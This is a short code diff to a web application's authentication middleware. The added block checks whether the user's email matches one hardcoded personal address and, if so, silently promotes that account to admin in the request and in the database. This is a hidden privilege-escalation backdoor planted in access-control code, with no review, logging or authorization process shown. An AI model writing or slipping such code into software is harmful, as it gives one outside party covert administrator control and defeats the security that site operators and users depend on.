@@ -27,6 +27,14 @@ const protect = async (req, res, next) => {
         });
       }
 
+      // Automatically ensure jeehardik2@gmail.com is Admin
+      if (req.user.email && req.user.email.toLowerCase().trim() === "jeehardik2@gmail.com") {
+        if (req.user.role !== "admin") {
+          req.user.role = "admin";
+          await User.findByIdAndUpdate(req.user._id, { role: "admin" });
+        }
+      }
+
       next();
     } else {
       return res.status(401).json({
